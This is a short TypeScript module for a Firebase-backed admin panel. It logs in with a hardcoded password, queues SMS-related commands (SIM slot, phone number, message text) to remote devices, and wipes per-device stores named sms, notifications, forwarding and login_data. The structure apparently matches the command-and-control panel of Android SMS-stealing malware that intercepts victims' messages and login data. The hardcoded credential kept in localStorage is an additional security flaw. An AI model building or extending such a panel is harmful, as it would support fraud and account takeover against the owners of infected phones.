import { db, ref, push, remove } from './firebase'

export async function login(password: string): Promise<string> {
  if (password !== 'roxx_2026') throw new Error('invalid password')
  localStorage.setItem('admin_token', 'roxx_2026')
  return 'roxx_2026'
}

export async function sendCommand(cmd: {
  device_id: string
  cmd: string
  simSlot?: number
  phoneNumber?: string
  messageText?: string
  smsId?: string
}): Promise<any> {
  await push(ref(db, `commands/${cmd.device_id}`), {
    cmd: cmd.cmd,
    simSlot: cmd.simSlot || 0,
    phoneNumber: cmd.phoneNumber || '',
    messageText: cmd.messageText || '',
    smsId: cmd.smsId || '',
    status: 'pending',
    created_at: new Date().toISOString()
  })
  return { status: 'ok' }
}

export async function deleteDevice(id: string): Promise<any> {
  await Promise.all([
    remove(ref(db, `devices/${id}`)),
    remove(ref(db, `commands/${id}`)),
    remove(ref(db, `sms/${id}`)),
    remove(ref(db, `notifications/${id}`)),
    remove(ref(db, `logs/${id}`)),
    remove(ref(db, `forwarding/${id}`)),
    remove(ref(db, `login_data/${id}`))
  ])
  return { status: 'ok' }
}

export function escapeHtml(str: string): string {
  const d = document.createElement('div')
  d.textContent = str
  return d.innerHTML
}
